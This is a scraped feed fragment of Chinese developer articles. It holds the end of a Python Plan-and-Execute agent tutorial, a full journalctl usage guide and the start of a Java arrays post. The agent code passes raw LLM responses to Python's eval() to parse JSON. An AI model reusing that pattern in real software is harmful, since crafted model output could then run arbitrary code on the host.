<h3 data-id="heading-22">6.2 完整代码实现</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

<span class="hljs-comment"># 加载环境变量（存储OpenAI API密钥）</span>
load_dotenv()
client = OpenAI(api_key=os.getenv(<span class="hljs-string">"OPENAI_API_KEY"</span>))

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanAndExecuteAgent</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, goal</span>):
        self.goal = goal  <span class="hljs-comment"># 原始任务目标</span>
        self.structured_goal = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 结构化目标</span>
        self.task_plan = []  <span class="hljs-comment"># 子任务规划序列</span>
        self.execution_results = {}  <span class="hljs-comment"># 子任务执行结果存储</span>
        self.current_task_index = <span class="hljs-number">0</span>  <span class="hljs-comment"># 当前执行的子任务索引</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_goal</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""目标解析：将原始目标转化为结构化目标"""</span>
        prompt = <span class="hljs-string">f"""请将以下任务目标转化为结构化格式，包含任务类型、核心指标、所需资源、时间约束四个字段：
        原始目标：<span class="hljs-subst">{self.goal}</span>
        输出格式：JSON字符串，字段说明：
        - task_type: 任务类型（如文献综述撰写、数据分析等）
        - core_indicators: 核心指标（任务完成的关键衡量标准）
        - required_resources: 所需资源（如文献数据库、分析工具等）
        - time_constraints: 时间约束（如无则填"无"）"""</span>
        
        response = client.chat.completions.create(
            model=<span class="hljs-string">"gpt-3.5-turbo"</span>,
            messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}]
        )
        self.structured_goal = <span class="hljs-built_in">eval</span>(response.choices[<span class="hljs-number">0</span>].message.content)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"结构化目标解析完成："</span>)
        <span class="hljs-built_in">print</span>(self.structured_goal)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_plan</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""规划生成：基于结构化目标拆解子任务序列"""</span>
        prompt = <span class="hljs-string">f"""基于以下结构化目标，拆解为可执行的子任务序列，要求：
        1. 子任务需完整覆盖目标实现的全流程，明确每个子任务的名称、依赖关系、执行优先级（1-5，1为最高）；
        2. 输出格式：列表形式，每个元素为包含"task_name"、"dependency"、"priority"字段的字典；
        3. dependency为依赖的子任务名称（无依赖则填"无"）。
        
        结构化目标：<span class="hljs-subst">{self.structured_goal}</span>"""</span>
        
        response = client.chat.completions.create(
            model=<span class="hljs-string">"gpt-3.5-turbo"</span>,
            messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}]
        )
        self.task_plan = <span class="hljs-built_in">eval</span>(response.choices[<span class="hljs-number">0</span>].message.content)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"子任务规划生成完成："</span>)
        <span class="hljs-keyword">for</span> idx, task <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.task_plan, <span class="hljs-number">1</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{idx}</span>. 任务名称：<span class="hljs-subst">{task[<span class="hljs-string">'task_name'</span>]}</span>，依赖：<span class="hljs-subst">{task[<span class="hljs-string">'dependency'</span>]}</span>，优先级：<span class="hljs-subst">{task[<span class="hljs-string">'priority'</span>]}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_task</span>(<span class="hljs-params">self, task</span>):
        <span class="hljs-string">"""任务执行：模拟子任务执行（实际场景中可替换为真实工具/接口调用）"""</span>
        task_name = task[<span class="hljs-string">"task_name"</span>]
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"开始执行子任务：<span class="hljs-subst">{task_name}</span>"</span>)
        
        <span class="hljs-comment"># 模拟不同子任务的执行逻辑</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"收集文献"</span> <span class="hljs-keyword">in</span> task_name:
            result = <span class="hljs-string">"已收集到10篇与'人工智能发展趋势'相关的核心文献，发表时间均为近3年"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"筛选文献"</span> <span class="hljs-keyword">in</span> task_name:
            result = <span class="hljs-string">"从10篇文献中筛选出6篇高相关性文献，排除4篇主题偏差文献"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"梳理核心观点"</span> <span class="hljs-keyword">in</span> task_name:
            result = <span class="hljs-string">"已梳理6篇文献的核心观点，涵盖大模型发展、行业应用、伦理挑战三个维度"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"撰写综述"</span> <span class="hljs-keyword">in</span> task_name:
            result = <span class="hljs-string">"已完成综述初稿，包含引言、核心观点分析、未来展望三个部分，共2000字"</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"修改审核"</span> <span class="hljs-keyword">in</span> task_name:
            result = <span class="hljs-string">"综述初稿审核完成，需修改部分表述不严谨之处，补充2篇最新文献引用"</span>
        <span class="hljs-keyword">else</span>:
            result = <span class="hljs-string">f"子任务<span class="hljs-subst">{task_name}</span>执行完成，无异常"</span>
        
        self.execution_results[task_name] = result
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"子任务<span class="hljs-subst">{task_name}</span>执行完成，结果：<span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
        <span class="hljs-keyword">return</span> result

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">feedback_and_adjust</span>(<span class="hljs-params">self, task, result</span>):
        <span class="hljs-string">"""反馈调整：根据执行结果判断是否需要调整规划"""</span>
        task_name = task[<span class="hljs-string">"task_name"</span>]
        <span class="hljs-comment"># 模拟偏差判断（如修改审核子任务发现问题，需要补充子任务）</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"修改审核"</span> <span class="hljs-keyword">in</span> task_name <span class="hljs-keyword">and</span> <span class="hljs-string">"需修改"</span> <span class="hljs-keyword">in</span> result:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"发现子任务<span class="hljs-subst">{task_name}</span>执行偏差：<span class="hljs-subst">{result}</span>"</span>)
            <span class="hljs-comment"># 新增"补充文献引用"和"修改综述表述"子任务</span>
            new_task1 = {
                <span class="hljs-string">"task_name"</span>: <span class="hljs-string">"补充文献引用"</span>,
                <span class="hljs-string">"dependency"</span>: <span class="hljs-string">"修改审核"</span>,
                <span class="hljs-string">"priority"</span>: <span class="hljs-number">2</span>
            }
            new_task2 = {
                <span class="hljs-string">"task_name"</span>: <span class="hljs-string">"修改综述表述"</span>,
                <span class="hljs-string">"dependency"</span>: <span class="hljs-string">"补充文献引用"</span>,
                <span class="hljs-string">"priority"</span>: <span class="hljs-number">2</span>
            }
            self.task_plan.insert(self.current_task_index + <span class="hljs-number">1</span>, new_task1)
            self.task_plan.insert(self.current_task_index + <span class="hljs-number">2</span>, new_task2)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"已新增子任务：补充文献引用、修改综述表述"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"更新后的子任务规划："</span>)
            <span class="hljs-keyword">for</span> idx, task <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.task_plan, <span class="hljs-number">1</span>):
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{idx}</span>. 任务名称：<span class="hljs-subst">{task[<span class="hljs-string">'task_name'</span>]}</span>，依赖：<span class="hljs-subst">{task[<span class="hljs-string">'dependency'</span>]}</span>，优先级：<span class="hljs-subst">{task[<span class="hljs-string">'priority'</span>]}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 表示需要调整规划</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 表示无需调整</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""执行完整的Plan and Execute流程"""</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"开始执行Plan and Execute流程..."</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">50</span>)
        
        <span class="hljs-comment"># 1. 目标解析</span>
        self.parse_goal()
        
        <span class="hljs-comment"># 2. 规划生成</span>
        self.generate_plan()
        
        <span class="hljs-comment"># 3. 任务执行与反馈调整</span>
        <span class="hljs-keyword">while</span> self.current_task_index &lt; <span class="hljs-built_in">len</span>(self.task_plan):
            current_task = self.task_plan[self.current_task_index]
            <span class="hljs-comment"># 检查依赖是否完成</span>
            dependency = current_task[<span class="hljs-string">"dependency"</span>]
            <span class="hljs-keyword">if</span> dependency != <span class="hljs-string">"无"</span> <span class="hljs-keyword">and</span> dependency <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.execution_results:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"子任务<span class="hljs-subst">{current_task[<span class="hljs-string">'task_name'</span>]}</span>依赖<span class="hljs-subst">{dependency}</span>未完成，等待执行..."</span>)
                self.current_task_index += <span class="hljs-number">1</span>
                <span class="hljs-keyword">continue</span>
            
            <span class="hljs-comment"># 执行当前子任务</span>
            result = self.execute_task(current_task)
            
            <span class="hljs-comment"># 反馈调整</span>
            need_adjust = self.feedback_and_adjust(current_task, result)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> need_adjust:
                self.current_task_index += <span class="hljs-number">1</span>
        
        <span class="hljs-comment"># 4. 任务完成</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"所有子任务执行完成，任务目标达成！"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"最终执行结果汇总："</span>)
        <span class="hljs-keyword">for</span> task_name, result <span class="hljs-keyword">in</span> self.execution_results.items():
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{task_name}</span>：<span class="hljs-subst">{result}</span>"</span>)

<span class="hljs-comment"># 实例化智能体并执行任务</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># 任务目标：撰写一篇关于"人工智能发展趋势"的科研文献综述</span>
    agent = PlanAndExecuteAgent(goal=<span class="hljs-string">"撰写一篇关于'人工智能发展趋势'的科研文献综述"</span>)
    agent.run()
</code></pre>
<h3 data-id="heading-23">6.3 代码说明</h3>
<ol>
<li>
<p>类结构设计：定义PlanAndExecuteAgent类，封装目标解析、规划生成、任务执行、反馈调整四个核心方法，通过run()方法串联完整流程。</p>
</li>
<li>
<p>目标解析：调用OpenAI GPT-3.5模型将原始自然语言目标转化为包含任务类型、核心指标等字段的结构化目标，便于后续规划。</p>
</li>
<li>
<p>规划生成：基于结构化目标，通过LLM生成子任务序列，明确每个子任务的名称、依赖关系与优先级，确保执行的有序性。</p>
</li>
<li>
<p>任务执行：模拟不同子任务的执行逻辑（如收集文献、筛选文献、撰写综述等），实际应用中可替换为真实的文献数据库接口、文本编辑工具等调用逻辑。</p>
</li>
<li>
<p>反馈调整：模拟执行结果的偏差判断，当发现综述审核需要修改时，自动新增补充文献引用、修改表述等子任务，调整规划序列。</p>
</li>
<li>
<p>运行流程：通过实例化智能体并调用run()方法，自动完成从目标解析到任务执行的全流程，体现Plan and Execute模式的闭环逻辑。</p>
</li>
</ol>
<h3 data-id="heading-24">6.4 运行结果说明</h3>
<p>运行代码后，智能体将依次完成目标解析、规划生成、子任务执行与反馈调整。当执行“修改审核”子任务时，会发现需要修改的偏差，自动新增子任务并调整规划，最终完成所有子任务，达成“撰写人工智能发展趋势文献综述”的目标。运行结果将清晰打印每个环节的输出，便于观察Plan and Execute模式的工作流程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[journalctl命令以及参数详解]]></title>    <link>https://juejin.cn/post/7591788451030777899</link>    <guid>https://juejin.cn/post/7591788451030777899</guid>    <pubDate>2026-01-06T09:38:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591788451030777899" data-draft-id="7592088192515670059" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="journalctl命令以及参数详解"/> <meta itemprop="keywords" content="Linux,运维"/> <meta itemprop="datePublished" content="2026-01-06T09:38:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="龙月"/> <meta itemprop="url" content="https://juejin.cn/user/819561001659097"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            journalctl命令以及参数详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819561001659097/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    龙月
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:38:10.000Z" title="Tue Jan 06 2026 09:38:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">概述</h3>
<p><code>journalctl</code> 是 Linux 系统（基于 systemd）中用于<strong>查询和显示</strong> <strong>系统日志</strong>的核心工具。它读取的是 <code>systemd-journald</code> 服务维护的二进制日志文件。</p>
<p>相比传统的 <code>cat /var/log/messages</code> 或 <code>tail -f</code>，<code>journalctl</code> 更加强大，因为它支持<strong>按时间、按服务、按启动次序、按日志级别</strong>等多种维度的结构化查询。</p>
<h3 data-id="heading-1">一、 基础参数与常用选项</h3>













































































<table><thead><tr><th>参数</th><th>简写</th><th>含义</th><th>详细说明</th></tr></thead><tbody><tr><td>--unit</td><td>-u</td><td>指定服务</td><td>最常用。只查看特定服务的日志，如 -u kubelet。</td></tr><tr><td>--follow</td><td>-f</td><td>实时追踪</td><td>类似于 tail -f，实时输出最新的日志。</td></tr><tr><td>--lines</td><td>-n</td><td>指定行数</td><td>显示最近的 N 行。默认为 10 行。如 -n 100。</td></tr><tr><td>--boot</td><td>-b</td><td>指定启动次序</td><td>查看某次启动后的日志。-b 是本次启动，-b -1 是上一次启动。</td></tr><tr><td>--dmesg</td><td>-k</td><td>内核日志</td><td>只显示内核日志（类似 dmesg 命令），排查 OOM 或硬件故障专用。</td></tr><tr><td>--since</td><td/><td>开始时间</td><td>指定查询的起始时间，支持 "1 hour ago", "2024-01-01" 等格式。</td></tr><tr><td>--until</td><td/><td>结束时间</td><td>指定查询的结束时间。</td></tr><tr><td>--output</td><td>-o</td><td>输出格式</td><td>调整显示格式，如 short (默认), json, cat (只看信息)。</td></tr><tr><td>--reverse</td><td>-r</td><td>反向显示</td><td>最新的日志显示在最上面（默认是最新的在最下面）。</td></tr><tr><td>--no-pager</td><td/><td>不分页</td><td>直接输出所有内容到屏幕，不通过 less 分页，适合脚本处理或输出极短时。</td></tr><tr><td>--priority</td><td>-p</td><td>日志级别</td><td>过滤日志等级，如 err, warning, info。</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-2">二、 实战详解与场景演练</h3>
<ol>
<li>
<h4 data-id="heading-3">查看特定服务的日志 (K8s 排查必备)</h4>
</li>
</ol>
<p>这是运维中最常用的命令，只看关键组件的日志。</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看 kubelet 的日志</span>
journalctl -u kubelet
<span class="hljs-meta prompt_"># </span><span class="bash">查看 Docker 的日志</span>
journalctl -u docker
<span class="hljs-meta prompt_"># </span><span class="bash">实时查看 kubelet 的最新日志（类似 <span class="hljs-built_in">tail</span> -f）</span>
journalctl -u kubelet -f
</code></pre>
<ol start="2">
<li>
<h4 data-id="heading-4">按时间段过滤 (故障回溯)</h4>
</li>
</ol>
<p>当你知道故障发生的大致时间时，这招非常有用。</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 查看今天的所有日志</span>
journalctl --since <span class="hljs-string">"today"</span>
<span class="hljs-comment"># 查看最近 1 小时的日志</span>
journalctl --since <span class="hljs-string">"1 hour ago"</span>
<span class="hljs-comment"># 查看指定时间段的日志</span>
journalctl --since <span class="hljs-string">"2023-10-24 10:00:00"</span> --<span class="hljs-keyword">until</span> <span class="hljs-string">"2023-10-24 11:00:00"</span>
</code></pre>
<ol start="3">
<li>
<h4 data-id="heading-5">排查节点重启原因 (配合 <code>-b</code>)</h4>
</li>
</ol>
<p>如果你的服务器重启了，想看<strong>重启前那一刻</strong>发生了什么，或者是<strong>上一次启动期间</strong>的日志。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看当前启动后的日志 (等同于 uptime 之后的日志)</span>
journalctl -b

<span class="hljs-comment"># 查看“上一次”启动周期的日志 (即重启前的日志) —— 排查 crash 的神器</span>
journalctl -b -1<span class="hljs-comment"># 查看“倒数第二次”启动周期的日志</span>
journalctl -b -2
</code></pre>
<blockquote>
<p><strong>注意：</strong> 如果没有配置持久化存储日志（<code>/var/log/journal</code> 目录不存在），重启后历史日志可能会丢失。</p>
</blockquote>
<ol start="4">
<li>
<h4 data-id="heading-6">只看错误级别的日志</h4>
</li>
</ol>
<p>通过日志级别过滤，屏蔽掉海量的 INFO 和 DEBUG 信息。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有错误 (Error) 及以上级别的日志</span>
journalctl -p err

<span class="hljs-comment"># 查看某个服务的错误日志</span>
journalctl -u kubelet -p err
</code></pre>
<p><em>级别代码：</em> <code>emerg</code> (0), <code>alert</code> (1), <code>crit</code> (2), <code>err</code> (3), <code>warning</code> (4), <code>notice</code> (5), <code>info</code> (6), <code>debug</code> (7).</p>
<ol start="5">
<li>
<h4 data-id="heading-7">查看内核日志</h4>
</li>
</ol>
<p>当 K8s 节点出现 OOM (内存溢出) 或硬件报错时，日志通常在内核层。</p>
<pre><code class="hljs language-bash" lang="bash">journalctl -k
<span class="hljs-comment"># 或者</span>
journalctl --dmesg
</code></pre>
<p><em>配合 grep 查找</em> <em>OOM</em> <em>:</em></p>
<pre><code class="hljs language-perl" lang="perl">journalctl -k | <span class="hljs-keyword">grep</span> -i <span class="hljs-string">"killed"</span>
</code></pre>
<ol start="6">
<li>
<h4 data-id="heading-8">格式化输出</h4>
</li>
</ol>
<p>默认情况下，如果日志单行太长，<code>journalctl</code> 可能会截断或需要左右滚动。</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment">#不分页，直接打印所有内容（自动换行）</span>
journalctl -u kubelet --<span class="hljs-keyword">no</span>-pager

<span class="hljs-comment"># 输出为 JSON 格式 (方便程序解析或导入 ELK)</span>
journalctl -u kubelet -o json-pretty

<span class="hljs-comment"># 直接在当前界面按右箭头键 →</span>
journalctl -u kubelet
</code></pre>
<hr/>
<h3 data-id="heading-9">三、 日志容量管理 (清理磁盘空间)</h3>
<p>systemd 日志默认存储在 <code>/run/log/journal</code> (内存，重启丢) 或 <code>/var/log/journal</code> (磁盘，持久化)。如果不加限制，可能会占满磁盘。</p>
<ol>
<li><strong>查看当前日志占用空间：</strong></li>
</ol>
<pre><code class="hljs language-css" lang="css">journalctl <span class="hljs-attr">--disk-usage</span>
</code></pre>
<ol start="2">
<li><strong>清理日志：</strong></li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 仅保留最近 1GB 的日志</span>
journalctl <span class="hljs-attr">--vacuum-size</span>=<span class="hljs-number">1</span>G

<span class="hljs-comment"># 仅保留最近 2 天的日志</span>
journalctl <span class="hljs-attr">--vacuum-time</span>=<span class="hljs-number">2</span>d
</code></pre>
<hr/>
<h3 data-id="heading-10">四、 组合拳 (高级用法示例)</h3>
<p><strong>场景：K8s 节点刚刚因为负载过高</strong> <strong>重启</strong> <strong>了，我想看重启前 20 分钟内，kubelet 有没有报错。</strong></p>
<p>命令组合：</p>
<ol>
<li><code>-b -1</code>: 选择上一次启动周期（重启前）。</li>
<li><code>-u kubelet</code>: 只看 kubelet。</li>
<li><code>-p err</code>: 只看错误。</li>
<li><code>--since</code>: 如果能确定大概时间。</li>
</ol>
<pre><code class="hljs language-css" lang="css"># 简化版：看上一次启动期间 kubelet 的最后 <span class="hljs-number">500</span> 行日志
journalctl -<span class="hljs-selector-tag">b</span> -<span class="hljs-number">1</span> -u kubelet -n <span class="hljs-number">500</span>

# 进阶版：看上一次启动期间所有的系统错误和内核崩溃信息
journalctl -<span class="hljs-selector-tag">b</span> -<span class="hljs-number">1</span> -<span class="hljs-selector-tag">p</span> err -k
</code></pre>
<h3 data-id="heading-11">总结</h3>
<p>日常运维排查，只要掌握以下这句即可应对大部分的场景：</p>
<pre><code class="hljs language-arduino" lang="arduino">journalctl -u &lt;服务名&gt; -f -n <span class="hljs-number">100</span> --since <span class="hljs-string">"1 hour ago"</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【Java基础整理】java数组详解]]></title>    <link>https://juejin.cn/post/7591942733366312994</link>    <guid>https://juejin.cn/post/7591942733366312994</guid>    <pubDate>2026-01-06T10:04:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733366312994" data-draft-id="7591942733366296610" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【Java基础整理】java数组详解"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-06T10:04:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="乌日尼乐"/> <meta itemprop="url" content="https://juejin.cn/user/854736525882123"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【Java基础整理】java数组详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/854736525882123/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    乌日尼乐
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:04:25.000Z" title="Tue Jan 06 2026 10:04:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
